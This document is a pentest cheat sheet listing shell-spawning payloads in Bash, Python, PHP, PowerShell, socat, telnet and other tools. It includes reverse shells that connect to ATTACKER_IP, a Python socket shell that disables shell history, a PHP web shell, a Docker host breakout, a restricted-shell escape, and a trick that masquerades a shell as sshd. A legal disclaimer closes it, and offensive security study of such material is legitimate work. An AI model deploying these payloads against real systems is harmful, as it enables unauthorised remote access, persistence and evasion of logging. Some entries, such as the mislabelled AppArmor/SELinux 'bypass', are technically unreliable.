# Spawning Shell Payloads - Comprehensive Cheat Sheet

This document contains payloads for spawning interactive shells across various scripting languages and environments, organized from basic to advanced techniques.

## Table of Contents
1. [Bash Shell Spawns](#bash-shell-spawns)
2. [Python Shell Spawns](#python-shell-spawns)
3. [Perl Shell Spawns](#perl-shell-spawns)
4. [PHP Shell Spawns](#php-shell-spawns)
5. [Ruby Shell Spawns](#ruby-shell-spawns)
6. [PowerShell Spawns](#powershell-spawns)
7. [Java Shell Spawns](#java-shell-spawns)
8. [Golang Shell Spawns](#golang-shell-spawns)
9. [Node.js Shell Spawns](#nodejs-shell-spawns)
10. [Lua Shell Spawns](#lua-shell-spawns)
11. [Awk Shell Spawns](#awk-shell-spawns)
12. [Telnet Shell Spawns](#telnet-shell-spawns)
13. [Socat Shell Spawns](#socat-shell-spawns)
14. [Windows CMD Shell Spawns](#windows-cmd-shell-spawns)
15. [Database Shell Spawns](#database-shell-spawns)
16. [Advanced Techniques](#advanced-techniques)

---

## Bash Shell Spawns

### Basic interactive shell
```bash
/bin/bash -i
```

### PTY spawn (better shell)
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Using script command
```bash
script -qc /bin/bash /dev/null
```

### Socat PTY spawn
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

---

## Python Shell Spawns

### Basic shell spawn
```python
python -c 'import os; os.system("/bin/bash")'
```

### Interactive PTY spawn
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Full TTY with term settings
```python
python -c 'import pty; pty.spawn("/bin/bash")'
# Then press Ctrl+Z
stty raw -echo; fg
# Then reset terminal after exit
reset
```

### Python one-liner PTY
```python
python -c "import pty; pty.spawn('/bin/sh')"
```

---

## Perl Shell Spawns

### Basic shell
```perl
perl -e 'exec "/bin/sh";'
```

### With PTY
```perl
perl -e 'use POSIX qw(setsid); setsid; exec "/bin/sh";'
```

### Perl interactive
```perl
perl -e 'system("/bin/bash")'
```

---

## PHP Shell Spawns

### Basic shell
```php
php -r 'system("/bin/sh");'
```

### Interactive shell
```php
php -r 'pcntl_exec("/bin/sh", ["-i"]);'
```

### Web shell
```php
<?php system($_GET['cmd']); ?>
```

### With PTY
```php
php -r '$pty = "/bin/bash"; posix_setsid(); proc_open($pty, [0=>STDIN,1=>STDOUT,2=>STDERR], $pipes);'
```

---

## Ruby Shell Spawns

### Basic shell
```ruby
ruby -e 'exec "/bin/sh"'
```

### Interactive PTY
```ruby
ruby -e 'require "pty"; PTY.spawn("/bin/bash") {|r,w,pid| Process.wait pid }'
```

### IRB shell
```ruby
irb
# Then within IRB:
system("/bin/bash")
```

---

## PowerShell Spawns

### Basic shell
```powershell
Start-Process -NoNewWindow -FilePath "cmd.exe"
```

### Interactive shell
```powershell
powershell -nop -c "$ps = [PowerShell]::Create(); $ps.AddScript('cmd /c start cmd.exe').Invoke()"
```

### With PTY (Windows)
```powershell
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = "cmd.exe"
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.RedirectStandardOutput = $true
$process.StartInfo.UseShellExecute = $false
$process.Start()
```

---

## Java Shell Spawns

### Basic shell
```java
Runtime.getRuntime().exec("/bin/bash");
```

### Interactive shell
```java
new ProcessBuilder("/bin/bash").inheritIO().start().waitFor();
```

### With PTY
```java
String[] cmd = { "/bin/bash", "-i" };
Process p = Runtime.getRuntime().exec(cmd);
```

---

## Golang Shell Spawns

### Basic shell
```go
package main
import "os/exec"
func main() {
    cmd := exec.Command("/bin/sh")
    cmd.Run()
}
```

### Interactive shell
```go
package main
import (
    "os"
    "os/exec"
)
func main() {
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = os.Stdin
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stderr
    cmd.Run()
}
```

---

## Node.js Shell Spawns

### Basic shell
```javascript
require('child_process').exec('/bin/sh')
```

### Interactive shell
```javascript
const { spawn } = require('child_process');
const sh = spawn('/bin/sh', ['-i']);
sh.stdin.pipe(process.stdin);
process.stdout.pipe(sh.stdout);
process.stderr.pipe(sh.stderr);
```

### PTY shell
```javascript
const pty = require('node-pty');
const shell = pty.spawn('/bin/bash', [], {
  name: 'xterm-color',
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env
});
```

---

## Lua Shell Spawns

### Basic shell
```lua
os.execute("/bin/sh")
```

### Interactive shell
```lua
io.popen("/bin/bash", "r")
```

### With PTY
```lua
local pty = require("pty")
pty.spawn("/bin/bash")
```

---

## Awk Shell Spawns

### Basic shell
```bash
awk 'BEGIN {system("/bin/sh")}'
```

### Interactive
```bash
awk 'BEGIN {while(1) {printf "$ "; getline cmd; system(cmd)}}'
```

---

## Telnet Shell Spawns

### Spawn shell via telnet
```bash
telnet ATTACKER_IP PORT | /bin/bash | telnet ATTACKER_IP (PORT+1)
```

### PTY over telnet
```bash
mknod backpipe p && telnet ATTACKER_IP PORT 0<backpipe | /bin/bash 1>backpipe
```

---

## Socat Shell Spawns

### Basic shell
```bash
socat exec:'/bin/sh',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:PORT
```

### SSL encrypted
```bash
socat openssl-connect:ATTACKER_IP:PORT,verify=0 exec:'/bin/sh',pty,stderr,setsid,sigint,sane
```

---

## Windows CMD Shell Spawns

### Basic cmd
```cmd
cmd.exe /k
```

### PowerShell interactive
```cmd
powershell -nop -c "$host.UI.RawUI.WindowTitle = 'Shell'; $ps = [PowerShell]::Create(); $ps.AddScript('while($true) { $host.UI.RawUI.WindowTitle = (Get-Location).Path + ''> ''; $cmd = $host.UI.ReadLine(); Invoke-Expression $cmd }').Invoke()"
```

---

## Database Shell Spawns

### MySQL
```sql
\! sh
-- or
system sh
```

### PostgreSQL
```sql
\! /bin/sh
```

### Oracle SQL
```sql
host /bin/bash
```

### MongoDB
```javascript
db.adminCommand({eval: "function(){ return runProgram('/bin/sh') }"})
```

---

## Advanced Techniques

### Python fully interactive TTY
```python
import pty
import socket
import os

s = socket.socket()
s.connect(('ATTACKER_IP', PORT))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
os.putenv('HISTFILE', '/dev/null')
pty.spawn('/bin/bash')
s.close()
```

### Staged shell spawn (useful for filters)
```bash
# Stage 1 - small initial payload
echo "exec /bin/bash" > /tmp/.s
# Stage 2 - execute
bash </tmp/.s
```

### Memory-only shell spawn
```bash
exec -a /usr/sbin/sshd /bin/bash
```

### Container escape shell spawn
```bash
# Docker breakout example
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash
```

### Restricted shell escape
```bash
# From rbash
BASH_CMDS[a]=/bin/sh;a
```

### AppArmor/SELinux bypass
```bash
cp /bin/bash /tmp/bash && /tmp/bash -p
```

### No-file shell spawn
```bash
exec <(echo "echo 'Hello from memory!'")
```

### Network namespace breakout
```bash
nsenter --net=/var/run/netns/NAMESPACE /bin/bash
```

## Important Notes

1. Many of these techniques require specific permissions or environmental conditions
2. Some payloads may be blocked by security controls (AppArmor, SELinux, etc.)
3. Always test in controlled environments before production use
4. Consider using encrypted channels for sensitive operations
5. Modern systems often have protections against some of these techniques

**Legal Disclaimer**: Only use these techniques on systems you own or have explicit permission to test. Unauthorized access to computer systems is illegal.